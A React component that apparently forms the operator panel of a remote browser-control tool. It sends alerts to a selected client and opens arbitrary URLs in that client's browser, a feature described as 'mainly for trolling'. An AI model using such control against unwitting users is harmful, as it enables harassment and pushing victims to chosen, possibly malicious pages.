import React from "react";
import { Zap, MessageCircleX, ExternalLink } from "lucide-react";
import { GlobalContext } from "../App";
import ActionBox from "./ActionBox";
export const QuickActionsPanel = ({ className = "" }) => {
  const [message, setMessage] = React.useState("");
  const { selectedClientId, endpointUrl } = React.useContext(GlobalContext);
  const handleAlert = async (message) => {
    await fetch(`${endpointUrl}/alert`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ message, client_id: selectedClientId }),
    });
  };
  const handleTabOpen = async (url) => {
    await fetch(`${endpointUrl}/openlink`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ url, client_id: selectedClientId }),
    });
  };
  return (
    <div
      className={`bg-white flex flex-col gap-6 overflow-y-auto rounded-lg shadow-lg outline outline-gray-300 outline-1 p-6 ${className}`}
    >
      <div className="flex items-center">
        <Zap className="h-6 w-6 text-blue-600 mr-2" />
        <h2 className="text-xl font-bold text-gray-800">Quick Actions</h2>
      </div>
      <ActionBox
        title="Send Alert"
        description="Send an alert to a client"
        submitText="Alert"
        onSubmit={handleAlert}
      />
      <ActionBox
        title="Open Tab"
        description="Open a new tab in a client's browser (mainly for trolling)"
        submitText="Open"
        inputPlaceholder="Enter URL"
        icon={ExternalLink}
        onSubmit={handleTabOpen}
      />
    </div>
  );
};
